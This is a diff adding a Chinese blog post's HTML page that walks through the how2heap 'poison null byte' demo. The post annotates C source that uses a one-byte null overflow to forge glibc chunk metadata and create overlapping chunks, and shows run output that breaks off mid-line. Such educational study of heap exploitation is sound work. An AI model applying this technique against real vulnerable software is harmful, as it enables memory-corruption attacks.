@@ -1,0 +1,749 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fox.jpg">
+  <link rel="icon" href="/img/fox.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="知世">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="参考网站12https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wikihttps:&#x2F;&#x2F;www.slideshare.net&#x2F;codeblue_jp&#x2F;cb16-matsukuma-en-68459606    poison null bytes序作者的话:本例推荐在ubuntu14.04上进行测试,并且只适用于没有tcache的glibc 这个poison null byte利用思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="how2heap总结计划五">
+<meta property="og:url" content="https://nightrainy.github.io/2020/01/29/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%BA%94/index.html">
+<meta property="og:site_name" content="知世の小屋">
+<meta property="og:description" content="参考网站12https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wikihttps:&#x2F;&#x2F;www.slideshare.net&#x2F;codeblue_jp&#x2F;cb16-matsukuma-en-68459606    poison null bytes序作者的话:本例推荐在ubuntu14.04上进行测试,并且只适用于没有tcache的glibc 这个poison null byte利用思路">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-01-29T07:35:40.000Z">
+<meta property="article:modified_time" content="2020-02-23T09:52:44.000Z">
+<meta property="article:author" content="知世">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>how2heap总结计划五 - 知世の小屋</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"nightrainy.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>知世</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/rick.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="how2heap总结计划五"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2020-01-29 15:35" pubdate>
+          2020年1月29日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          35 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">how2heap总结计划五</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+</blockquote>
+<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//ctf-wiki.github.io/ctf-wiki</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="poison-null-bytes"><a href="#poison-null-bytes" class="headerlink" title="poison null bytes"></a>poison null bytes</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>作者的话:本例推荐在ubuntu14.04上进行测试,并且只适用于没有tcache的glibc</p>
+<p>这个poison null byte利用思路依旧是制造一个overlapping chunk,虽然作者说要在ubuntu14.04上测试,但其实ubuntu16.04也是可以的,说明只要没有tcache,这种攻击方式就是可以使用的:)</p>
+<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>这里我也删了一部分作者的话,加了些注释</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>                                                                                                                              </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>                                                                                                                                      </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>                                                                                                                                      </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span>                                                                                                                                      </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span>                                                                                                                                      </span><br>                                                                                                                                                         <br>                                                                                                                                                         <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>                                                                                                                                               </span><br><span class="hljs-function"></span>&#123;                                                                                                                                                                                  <br>        <span class="hljs-type">uint8_t</span>* a;                                                                                                                                      <br>        <span class="hljs-type">uint8_t</span>* b;                                                                                                                                      <br>        <span class="hljs-type">uint8_t</span>* c;                                                                                                                                      <br>        <span class="hljs-type">uint8_t</span>* b1;                                                                                                                                     <br>        <span class="hljs-type">uint8_t</span>* b2;                                                                                                                                     <br>        <span class="hljs-type">uint8_t</span>* d;                                                                                                                                      <br>        <span class="hljs-type">void</span> *barrier;                                                                                                                                   <br>                                                                                                                                                         <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);                                                                                           <br>        a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);                                                                                                                    <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;a: %p\n&quot;</span>, a);                                                                                                                   <br>        <span class="hljs-type">int</span> real_a_size = <span class="hljs-built_in">malloc_usable_size</span>(a);             <br>        <span class="hljs-comment">//我们想溢出&#x27;a&#x27;的话,我们需要知道&#x27;a&#x27;的真实大小,因为舍入,a可能比0x100更大(我觉得这个舍入就是加了size,presize然后空间复用了一下</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span>                                                         <br>                <span class="hljs-string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);                                                                  <br><br>        <span class="hljs-comment">//chunk size属性的最小的有效字节不能是0x00,最小的也必须是0x10,因为chunk的size包括请求的量加上元数据所需的大小(也就是我们的size和pre_size然后空间复用</span><br>        <span class="hljs-comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.                                                               </span><br><span class="hljs-comment">         * the least significant byte of this will be 0x10, because the size of the chunk includes                                                       </span><br><span class="hljs-comment">         * the amount requested plus some amount required for the metadata. */</span>                                                                           <br>        b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);                                                                                                                    <br>                                                                                                                                                         <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b: %p\n&quot;</span>, b);                                                                                                                   <br>                                                                                                                                                         <br>        c = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);                                                                                                                    <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;c: %p\n&quot;</span>, c);                                                                                                                   <br>                                                                                                                                                         <br>        barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);              <br><br>        <span class="hljs-comment">//c我们分配了barrier,这样我们free c的时候就不会被合并到top chunk里了,这个burrier并不是必须的,只不过是为了减少可能产生的问题                                                                                                     </span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span>                                    <br>                <span class="hljs-string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);                                                    <br>                                                                                                                                                         <br>        <span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);                                                                                                       <br>                                                                                                                                                         <br>        <span class="hljs-comment">//在新版本的glibc中添加了新的check即: size==prev_next(next_chunk)</span><br>        <span class="hljs-comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc                                                                    </span><br>        <span class="hljs-comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30        </span><br>        <span class="hljs-comment">//这个被新增的check要求我们允许b中有null指针而不仅仅是c                                       </span><br>        <span class="hljs-comment">// this added check requires we are allowed to have null pointers in b (not just a c string)                                                     </span><br>        <span class="hljs-comment">//*(size_t*)(b+0x1f0) = 0x200;   </span><br>        <span class="hljs-comment">//在新版本的glibc中我们需要让我们更新的size包含b自身去pass &#x27;chunksize(P)!=prev_size(next_chunk(P))&#x27;                                                                                                                </span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span>                                      <br>                <span class="hljs-string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);           <br>        <br>        <span class="hljs-comment">//我们将此位置设为0x200,因为0x200==(0x211&amp;0xff00)</span><br>        <span class="hljs-comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)   </span><br>        <span class="hljs-comment">//这个是b.size的值在被null字节覆盖之后的值                                                                              </span><br>        <span class="hljs-comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte                                                       </span><br>        *(<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">+0x1f0</span>) = <span class="hljs-number">0x200</span>;                                                                                                                     <br>        <br>        <span class="hljs-comment">//这个技术通过覆盖一个free chunk的元数据来生效</span><br>        <span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk                                                                         </span><br>        <span class="hljs-built_in">free</span>(b);                                                                                                                                         <br>                                                                                                                                                         <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);                                                                                                  <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>); <br>        <span class="hljs-comment">//我们通过用一个null字节来溢出a来修改b的元数据                                                                                   </span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);                                                           <br>        a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;                                                                                          </span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);                                                                                                  <br>                                                                                                                                                         <br>        <span class="hljs-type">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-2</span>;                                                                                                    <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);                                                                                       <br><br>        <span class="hljs-comment">//这个malloc将会在b上调用unlink</span><br>        <span class="hljs-comment">// This malloc will result in a call to unlink on the chunk where b was.   </span><br>        <span class="hljs-comment">//新增的chunk,如果没有像之前那样被正确处理,就会检测堆是否被损坏了                                                                     </span><br>        <span class="hljs-comment">// The added check (commit id: 17f487b), if not properly handled as we did before,                                                               </span><br>        <span class="hljs-comment">// will detect the heap corruption now.                                                                                                          </span><br>        <span class="hljs-comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where                                                                            </span><br>        <span class="hljs-comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)                                                           </span><br>                <span class="hljs-comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span><br>        <span class="hljs-comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,<br>                *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br>        b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b1: %p\n&quot;</span>,b1);<br>        <span class="hljs-comment">//现在我们malloc b1,他将会被放在b的地方,此时,c的prev_size将会被更新</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span><br>                <span class="hljs-string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span><br>                <span class="hljs-string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br>        <span class="hljs-comment">//我们malloc b2作为我们的攻击目标</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);<br>        <span class="hljs-comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span><br><br>        b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b2: %p\n&quot;</span>,b2);<br><br>        <span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);<br>        <br>        <span class="hljs-comment">//现在我们释放b1和c,这将会合并b1和c(无视b2)</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);<br><br>        <span class="hljs-built_in">free</span>(b1);<br>        <span class="hljs-built_in">free</span>(c);<br><br>        <span class="hljs-comment">//现在我们malloc d来和b2重叠</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);<br>        d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;d: %p\n&quot;</span>,d);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);<br>        <span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;New b2 content:\n%s\n&quot;</span>,b2);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span><br>                <span class="hljs-string">&quot;for the clear explanation of this technique.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Welcome <span class="hljs-keyword">to</span> poison <span class="hljs-keyword">null</span> byte <span class="hljs-number">2.0</span>!<br>Tested <span class="hljs-keyword">in</span> Ubuntu <span class="hljs-number">14.04</span> <span class="hljs-number">64</span><span class="hljs-built_in">bit</span>.<br>This technique only works <span class="hljs-keyword">with</span> disabled tcache-option <span class="hljs-keyword">for</span> glibc, see build_glibc.sh <span class="hljs-keyword">for</span> build instructions.<br>This technique can be used <span class="hljs-keyword">when</span> you have an off-by-one into a malloc<span class="hljs-symbol">&#x27;ed</span> region <span class="hljs-keyword">with</span> a <span class="hljs-keyword">null</span> byte.<br>We allocate <span class="hljs-number">0</span>x100 bytes <span class="hljs-keyword">for</span> <span class="hljs-symbol">&#x27;a</span>&#x27;.<br>a: <span class="hljs-number">0</span>x241a010<br>Since we want <span class="hljs-keyword">to</span> overflow <span class="hljs-symbol">&#x27;a</span>&#x27;, we need <span class="hljs-keyword">to</span> know the <span class="hljs-symbol">&#x27;real</span>&#x27; size <span class="hljs-keyword">of</span> <span class="hljs-symbol">&#x27;a</span>&#x27; (it may be more than <span class="hljs-number">0</span>x100 because <span class="hljs-keyword">of</span> rounding): <span class="hljs-number">0</span>x108<br>b: <span class="hljs-number">0</span>x241a120<br>c: <span class="hljs-number">0</span>x241a330<br>We allocate a barrier at <span class="hljs-number">0</span>x241a440, so that c <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> consolidated <span class="hljs-keyword">with</span> the top-chunk <span class="hljs-keyword">when</span> freed.<br>The barrier <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> strictly necessary, but makes things less confusing<br><span class="hljs-keyword">In</span> newer versions <span class="hljs-keyword">of</span> glibc we will need <span class="hljs-keyword">to</span> have our updated size inside b itself <span class="hljs-keyword">to</span> pass the check <span class="hljs-symbol">&#x27;chunksize</span>(P) != prev_size (next_chunk(P))&#x27;<br>b.size: <span class="hljs-number">0</span>x211<br>b.size <span class="hljs-keyword">is</span>: (<span class="hljs-number">0</span>x200 + <span class="hljs-number">0</span>x10) | prev_in_use<br>We overflow <span class="hljs-symbol">&#x27;a</span>&#x27; <span class="hljs-keyword">with</span> a single <span class="hljs-keyword">null</span> byte into the metadata <span class="hljs-keyword">of</span> <span class="hljs-symbol">&#x27;b</span>&#x27;<br>b.size: <span class="hljs-number">0</span>x200<br>c.prev_size <span class="hljs-keyword">is</span> <span class="hljs-number">0</span>x210<br>We will pass the check since chunksize(P) == <span class="hljs-number">0</span>x200 == <span class="hljs-number">0</span>x200 == prev_size (next_chunk(P))<br>b1: <span class="hljs-number">0</span>x241a120<br>Now we malloc <span class="hljs-symbol">&#x27;b1</span>&#x27;. It will be placed where <span class="hljs-symbol">&#x27;b</span>&#x27; was. At this point c.prev_size should have been updated, but it was <span class="hljs-keyword">not</span>: <span class="hljs-number">0</span>x210<br>Interestingly, the updated value <span class="hljs-keyword">of</span> c.prev_size has been written <span class="hljs-number">0</span>x10 bytes before c.prev_size: f0<br>We malloc <span class="hljs-symbol">&#x27;b2</span>&#x27;, our <span class="hljs-symbol">&#x27;victim</span>&#x27; chunk.<br>b2: <span class="hljs-number">0</span>x241a230<br>Current b2 content:<br>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br>Now we free <span class="hljs-symbol">&#x27;b1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-symbol">&#x27;c</span>&#x27;: this will consolidate the chunks <span class="hljs-symbol">&#x27;b1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-symbol">&#x27;c</span>&#x27; (forgetting about <span class="hljs-symbol">&#x27;b2</span>&#x27;).<br>Finally, we allocate <span class="hljs-symbol">&#x27;d</span>&#x27;, overlapping <span class="hljs-symbol">&#x27;b2</span>&#x27;.<br>d: <span class="hljs-number">0</span>x241a120<br>Now <span class="hljs-symbol">&#x27;d</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-symbol">&#x27;b2</span>&#x27; overlap.<br><span class="hljs-keyword">New</span> b2 